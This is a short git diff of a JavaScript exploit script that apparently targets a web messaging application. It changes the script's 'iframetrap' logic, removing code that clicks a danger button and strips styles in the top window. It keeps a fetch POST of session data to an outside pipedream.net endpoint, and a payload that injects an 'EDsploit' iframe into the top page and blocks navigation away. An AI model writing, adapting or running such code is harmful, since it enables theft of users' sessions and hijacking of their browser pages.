@@ -33,13 +33,6 @@ const ur = new URL(document.currentScript.src);
 		)
 	};
 
-	if (ur.searchParams.get("iframetrap") !== "false") {
-		window.top.document.querySelector('button[class="btn btn-danger"]').click()
-		const parents = window.top.document.querySelector('.view-message.printable-message.ck-content');
-		const style = parents.querySelectorAll(':scope > style');
-		style.forEach(s => s.remove());
-	}
-
 	try {
 		await fetch('https://3169a8cec3d0dff512a354276b174afb.m.pipedream.net/session', {
 			method: "POST",
@@ -54,7 +47,7 @@ const ur = new URL(document.currentScript.src);
 })();
 
 async function payload() {
-	if (ur.searchParams.get("iframetrap") !== "false" || window.top.document.body.querySelector('iframe[class=EDsploit]')) return;
+	if (ur.searchParams.get("iframetrap") === "false" || window.top.document.body.querySelector('iframe[class=EDsploit]')) return;
 	window.top.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
 
 	const i = window.top.document.createElement('iframe');
